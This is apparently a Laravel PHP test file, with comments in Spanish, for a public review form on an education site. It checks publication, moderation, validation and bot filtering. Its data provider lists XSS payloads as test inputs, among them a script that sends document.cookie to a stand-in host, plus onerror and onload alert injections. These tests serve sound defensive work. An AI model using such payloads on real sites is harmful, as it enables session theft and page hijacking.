<?php

namespace Tests\Feature\Public;

use App\Enums\EstadoOpinion;
use App\Models\Opinion;
use App\Support\OpcionesOpinion;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Inertia\Testing\AssertableInertia as Assert;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

class OpinionTest extends TestCase
{
    use RefreshDatabase;

    /** @return array<string, mixed> */
    private function datos(array $cambios = []): array
    {
        return [
            'nombre' => 'Ana Pérez',
            'pais' => 'pe',
            'ciudad' => 'Lima',
            'institucion' => 'IEP Innova',
            'curso' => OpcionesOpinion::STUDIO,
            'estrellas' => 5,
            'comentario' => 'Me ahorró muchas horas de planificación cada semana.',
            'acepta_publicacion' => true,
            ...$cambios,
        ];
    }

    private function enviar(array $cambios = [])
    {
        return $this->from(route('home'))->post(route('opiniones.store'), $this->datos($cambios));
    }

    // --- Publicación ---

    public function test_el_testimonio_se_publica_al_instante(): void
    {
        $this->from(route('home'))
            ->followingRedirects()
            ->post(route('opiniones.store'), $this->datos())
            ->assertInertia(fn (Assert $page) => $page
                ->hasFlash('opinion', 'publicada')
                ->where('opiniones.0.nombre', 'Ana Pérez')
                ->where('estadisticas.resenas', 1)
            );

        $this->assertSame(EstadoOpinion::Aprobada, Opinion::sole()->estado);
    }

    public function test_un_testimonio_con_palabras_ofensivas_queda_en_revision(): void
    {
        $this->from(route('home'))
            ->followingRedirects()
            ->post(route('opiniones.store'), $this->datos(['comentario' => 'Son unos ESTAFADORES, no lo recomiendo para nada.']))
            ->assertInertia(fn (Assert $page) => $page
                ->hasFlash('opinion', 'en_revision')
                ->has('opiniones', 0)
            );

        $this->assertSame(EstadoOpinion::Pendiente, Opinion::sole()->estado);
    }

    public function test_la_publicacion_automatica_se_puede_desactivar(): void
    {
        config(['avanzia.opiniones.publicacion_automatica' => false]);

        $this->enviar();

        $this->assertSame(EstadoOpinion::Pendiente, Opinion::sole()->estado);
    }

    public function test_no_acepta_el_mismo_testimonio_dos_veces(): void
    {
        $this->enviar();
        $this->enviar()->assertSessionHasErrors('comentario');

        $this->assertSame(1, Opinion::count());
    }

    // --- Ataques por los campos de texto ---

    /** @return array<string, array{string, string}> */
    public static function textosMaliciosos(): array
    {
        return [
            'script' => ['comentario', 'Buen curso <script>fetch("//x.y?c="+document.cookie)</script> gracias'],
            'imagen con onerror' => ['comentario', 'Excelente <img src=x onerror=alert(1)> de verdad'],
            'etiqueta de cierre' => ['comentario', 'Muy bueno todo </p><h1>falso</h1> el curso'],
            'comentario HTML' => ['comentario', 'Muy bueno <!-- oculto --> el curso entero'],
            'enlace' => ['comentario', 'Gana dinero rápido entrando en https://spam.example ahora'],
            'dominio suelto' => ['comentario', 'Visiten mi página tiendita.com para más cursos'],
            'correo' => ['comentario', 'Escríbanme a vendedor@spam.com para ofertas'],
            'caracteres repetidos' => ['comentario', 'Bueno bueno bueeeeeeeeeeeeeno el curso'],
            'html en el nombre' => ['nombre', '<b>Admin</b>'],
            'nombre con símbolos' => ['nombre', 'Ana {{ constructor }}'],
            'html en la ciudad' => ['ciudad', 'Lima<svg onload=alert(1)>'],
            'html en la institución' => ['institucion', 'Colegio <script>x</script>'],
        ];
    }

    #[DataProvider('textosMaliciosos')]
    public function test_rechaza_codigo_y_spam_en_los_campos_de_texto(string $campo, string $valor): void
    {
        $this->enviar([$campo => $valor])->assertSessionHasErrors($campo);

        $this->assertSame(0, Opinion::count());
    }

    public function test_limpia_caracteres_invisibles_y_de_control(): void
    {
        // U+202E invierte el texto visible y U+200B es invisible: se usan para falsear nombres
        $this->enviar([
            'nombre' => "  Ana\u{202E} \u{200B}Pérez\x00  ",
            'comentario' => "Muy buen curso.\r\n\r\n\r\n\r\nLo recomiendo   a todos.",
        ]);

        $opinion = Opinion::sole();
        $this->assertSame('Ana Pérez', $opinion->nombre);
        $this->assertSame("Muy buen curso.\n\nLo recomiendo a todos.", $opinion->comentario);
    }

    public function test_permite_signos_habituales_que_no_son_html(): void
    {
        $this->enviar(['comentario' => 'Me encantó <3 y mi nota subió de 14 a > 18. ¡Gracias!']);

        $this->assertSame('Me encantó <3 y mi nota subió de 14 a > 18. ¡Gracias!', Opinion::sole()->comentario);
    }

    public function test_solo_acepta_cursos_y_paises_de_la_lista(): void
    {
        $this->enviar([
            'curso' => 'Curso inventado para engañar',
            'pais' => 'xx',
        ])->assertSessionHasErrors(['curso', 'pais']);

        $this->assertSame(0, Opinion::count());
    }

    public function test_valida_los_campos_obligatorios_y_los_limites(): void
    {
        $this->enviar([
            'nombre' => '',
            'estrellas' => 7,
            'comentario' => str_repeat('palabra ', 100),
            'acepta_publicacion' => false,
        ])->assertSessionHasErrors(['nombre', 'estrellas', 'comentario', 'acepta_publicacion']);

        $this->assertSame(0, Opinion::count());
    }

    public function test_los_mensajes_de_error_estan_en_espanol(): void
    {
        $this->enviar(['nombre' => ''])->assertSessionHasErrors(['nombre' => 'Completa tu nombre.']);
    }

    public function test_ignora_los_envios_de_bots(): void
    {
        $this->enviar(['sitio_web' => 'https://spam.example'])->assertRedirect();

        $this->assertSame(0, Opinion::count());
    }

    public function test_el_comentario_publicado_no_se_puede_inyectar_en_el_html(): void
    {
        // Aunque llegara a la base por otra vía, la página nunca lo imprime como HTML
        Opinion::factory()->aprobada()->create(['comentario' => '</script><script>alert(1)</script>']);

        $this->get(route('home'))->assertDontSee('</script><script>alert(1)', false);
    }
}
